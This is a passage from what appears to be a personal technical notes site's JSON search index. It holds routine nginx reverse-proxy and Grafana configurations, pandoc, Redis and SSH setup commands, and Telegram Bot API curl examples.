style=\"color:#e6db74\"\u003e\u0026#39;^/img/(.*)\u003c/span\u003e$\u0026#39; \u003cspan style=\"color:#e6db74\"\u003e/static/\u003c/span\u003e$1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/static\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginxconfig.io/src\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eindex\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enginx.svg\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"2\"\u003e2\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://localhost/photo/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/photo\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginxconfig.io/src\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etry_files\u003c/span\u003e $uri \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e$uri \u003cspan style=\"color:#e6db74\"\u003e@pic\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@pic\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erewrite\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;^/photo/(.*)\u003c/span\u003e$\u0026#39; \u003cspan style=\"color:#e6db74\"\u003e/static/\u003c/span\u003e$1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"3\"\u003e3\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# remove prefix path and allow proxy_pass POST\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/upload/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Remove path\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003erewrite\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e^/upload/(.*)\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e$1  \u003cspan style=\"color:#e6db74\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://logo\u003c/span\u003e$uri$is_args$args;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Proxy_pass POST\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_http_version\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e.1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eConnection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;upgrade\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_cache_bypass\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#proxy_redirect  https://logo/ /;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eindex\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eindex.html\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex.htm\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egrafana behind nginx\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"serversslconf\"\u003eserver/ssl.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_certificate\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/go2cloudten.com.crt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/go2cloudten.com.key\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_ciphers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e50m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"serverproxyconf\"\u003eserver/proxy.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"grafanaconf\"\u003egrafana.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e       \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003egrafana-test.go2cloudten.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003egrafana.go2cloudten.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eserver/ssl.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eserver/proxy.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003elogs/grafana.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003elogs/grafana.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003ehttp://grafana\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_connect_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_read_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e700\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_send_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e700\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eConnection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Upgrade\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Nginx docs"},{"categories":null,"contents":" texlive macOS # brew install textlive # npm i -g mermaid-filter # Render mermaid pandoc -F mermaid-filter -o readme.pdf readme.md Ubuntu # sudo apt install pandoc -y # sudo apt-get -y install texlive-latex-recommended texlive-pictures texlive-latex-extra texlive-fonts-recommended # npm i -g mermaid-filter pandoc -F mermaid-filter -o readme.pdf readme.md ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/pandoc/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etexlive\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003emacOS\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# brew install textlive\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# npm i -g mermaid-filter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Render mermaid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epandoc -F mermaid-filter -o readme.pdf readme.md\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eUbuntu\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sudo apt install pandoc -y\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sudo apt-get -y install texlive-latex-recommended texlive-pictures texlive-latex-extra texlive-fonts-recommended\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# npm i -g mermaid-filter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epandoc -F mermaid-filter -o readme.pdf readme.md\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Pandoc Command"},{"categories":null,"contents":" Install # Ubuntu22.04 sudo add-apt-repository ppa:redislabs/redis sudo apt install redis-server ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/redis/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eInstall\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Ubuntu22.04\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo add-apt-repository ppa:redislabs/redis\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install redis-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Redis Install Command"},{"categories":null,"contents":" Generate ssh key # RSA ssh-keygen -m PEM -t rsa -b 4096 -C \u0026#34;zeyanlin@outlook.com\u0026#34; # ED25519 ssh-keygen -t ed25519 -C \u0026#34;dev\u0026#34; -f ~/.ssh/ed25519 ssh config Host private.example.com ProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/ssh/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGenerate ssh key\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# RSA\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh-keygen -m PEM -t rsa -b \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e -C \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;zeyanlin@outlook.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# ED25519\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh-keygen -t ed25519 -C \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dev\u0026#34;\u003c/span\u003e -f ~/.ssh/ed25519\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003essh config\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-sshconfig\" data-lang=\"sshconfig\"\u003eHost private.example.com\n  ProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"SSH Command"},{"categories":null,"contents":" getUpdates curl \u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/getUpdates\u0026#39; | jq . sendMessage # chat curl \u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026#39; # thread curl \u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026amp;message_thread_id=14\u0026#39; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/telegram/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egetUpdates\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/getUpdates\u0026#39;\u003c/span\u003e | jq .\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esendMessage\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# chat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan 